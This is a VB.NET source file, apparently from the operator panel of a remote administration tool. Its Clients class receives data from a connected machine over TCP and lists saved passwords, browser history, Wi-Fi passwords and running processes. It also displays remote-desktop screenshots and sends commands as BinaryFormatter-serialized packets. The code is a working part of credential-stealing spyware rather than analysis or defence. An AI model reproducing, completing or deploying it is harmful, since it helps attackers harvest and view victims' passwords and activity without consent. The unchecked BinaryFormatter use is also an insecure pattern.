Imports System.IO
Imports System.Net.Sockets
Imports System.Runtime.Serialization.Formatters.Binary
Imports PacketLib.Packet

Public Class Clients
    Public Property C As TcpClient
    Public Property ID As String
    Public Property Local_Port As Integer
    Public Property Main_Form As New Client_Form(Me)
    Public Property Viewer As New RD_Form(Me)

    Public Async Sub SetPW(ByVal Data As Object())

        Main_Form.Loading_PW.Visible = False
        Main_Form.Loading_PW.Active = False

        Dim Clear_LV As Task = Task.Run(Sub() Main_Form.Passwords_ListView.Items.Clear())
        Await Clear_LV

        Await Task.Run(Sub()
                           For Each H In Data

                               Dim LI As New ListViewItem(H(0).ToString)
                               LI.SubItems.Add(H(1).ToString)
                               LI.SubItems.Add(H(2).ToString)
                               LI.SubItems.Add(H(3).ToString)

                               Main_Form.Passwords_ListView.Items.Add(LI)
                           Next
                       End Sub)

        GC.Collect()
        GC.WaitForPendingFinalizers()
        NativeAPI.SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
        NativeAPI.EmptyWorkingSet(Process.GetCurrentProcess().Handle)

    End Sub
    Public Async Sub SetHist(Data As Object())

        Main_Form.Loading_Hist.Visible = False
        Main_Form.Loading_Hist.Active = False

        Dim Clear_LV As Task = Task.Run(Sub() Main_Form.Hist_ListView.Items.Clear())
        Await Clear_LV

        Await Task.Run(Sub()
                           For Each H In Data

                               Dim LI As New ListViewItem(H(0).ToString)
                               LI.SubItems.Add(H(1).ToString)
                               LI.SubItems.Add(H(2).ToString)
                               LI.SubItems.Add(H(3).ToString)

                               Main_Form.Hist_ListView.Items.Add(LI)
                           Next
                       End Sub)

        GC.Collect()
        GC.WaitForPendingFinalizers()
        NativeAPI.SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
        NativeAPI.EmptyWorkingSet(Process.GetCurrentProcess().Handle)

    End Sub
    Public Async Sub SetW_PW(Data As Object())

        Main_Form.Loading_W_PW.Visible = False
        Main_Form.Loading_W_PW.Active = False

        Dim Clear_LV As Task = Task.Run(Sub() Main_Form.W_PW_ListView.Items.Clear())
        Await Clear_LV

        Await Task.Run(Sub()
                           For Each H In Data


                               Try
                                   Dim LI As New ListViewItem(H(0).ToString)
                                   LI.SubItems.Add(H(1).ToString)

                                   Main_Form.W_PW_ListView.Items.Add(LI)
                               Catch ex As Exception

                               End Try

                           Next
                       End Sub)

        GC.Collect()
        GC.WaitForPendingFinalizers()
        NativeAPI.SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
        NativeAPI.EmptyWorkingSet(Process.GetCurrentProcess().Handle)
    End Sub
    Public Async Sub Set_Tasks(Data As Object())

        Main_Form.Helper_Task_Label.Visible = False
        Main_Form.Loading_tasks.Visible = False
        Main_Form.Loading_tasks.Active = False
        Main_Form.RefreshToolStripMenuItem.Enabled = True

        Dim Clear_LV As Task = Task.Run(Sub() Main_Form.Tasks_listview.Items.Clear())
        Await Clear_LV

        Await Task.Run(Sub()
                           Dim ImageList = New ImageList()
                           ImageList.ColorDepth = ColorDepth.Depth32Bit

                           ImageList.ImageSize = New Size(32, 32)
                           Main_Form.Tasks_listview.SmallImageList = ImageList

                           Dim x As Integer = 0

                           For Each H In Data

                               Dim listViewItem = Main_Form.Tasks_listview.Items.Add(H(0).ToString)

                               Try
                                   Dim B_Image As Byte() = CType(H(1), Byte())

                                   Dim B As Bitmap = BytesToImage(B_Image)

                                   ImageList.Images.Add(x, B)

                               Catch ex As Exception
                                   Dim B As Bitmap = My.Resources.imageres_15.ToBitmap
                                   ImageList.Images.Add(x, B)
                               End Try

                               listViewItem.ImageKey = x
                               x += 1

                           Next

                       End Sub)

        Main_Form.Tasks_listview.Sort()

        GC.Collect()
        GC.WaitForPendingFinalizers()
        NativeAPI.SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
        NativeAPI.EmptyWorkingSet(Process.GetCurrentProcess().Handle)
    End Sub
    Public Async Sub Set_Delete_Proc(Data As Object())

        Await Task.Run(Sub()
                           If Data(2) = True Then
                               For Each H As ListViewItem In Main_Form.Tasks_listview.Items
                                   If H.Text = Data(1).ToString Then
                                       H.Remove()
                                   End If
                               Next
                           End If
                       End Sub)

    End Sub
    Public Async Sub SetRD(Data As Object())
        Await Task.Run(Sub()
                           Viewer.PictureBox1.Image = BytesToImage(Data(0))
                           Viewer.LabeledDivider2.Text = Helpers.Numeric2Bytes(Data(0).Length)
                       End Sub)

    End Sub
    Public Function BytesToImage(ByVal Bytesss As Byte()) As Image
        Using mStream As New MemoryStream(Bytesss)
            Return Image.FromStream(mStream)
        End Using
    End Function

    Public Sub Sender(P As PacketLib.Packet.PacketMaker)
        Dim B As New BinaryFormatter
        Task.Run(Sub() B.Serialize(Me.C.GetStream, P))
    End Sub
End Class
